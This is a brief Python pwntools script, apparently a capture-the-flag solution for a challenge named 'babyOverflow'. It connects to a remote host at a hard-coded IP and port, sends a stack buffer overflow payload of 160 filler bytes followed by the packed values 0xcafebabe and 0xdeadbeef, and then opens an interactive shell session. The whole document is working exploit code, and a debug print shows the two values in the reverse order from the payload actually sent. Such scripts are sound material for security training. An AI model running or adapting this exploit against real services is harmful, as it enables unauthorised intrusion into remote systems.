from pwn import *
from pwnlib.util.packing import *
conn = remote("3.101.12.127",5001)
# conn = process("./babyOverflow")

conn.recvline()
p = b'a'*160+  p64(0xcafebabe) + p64(0xdeadbeef)
conn.sendline(p)
print(b'a'*160+ p64(0xdeadbeef)+p64(0xcafebabe))
conn.interactive()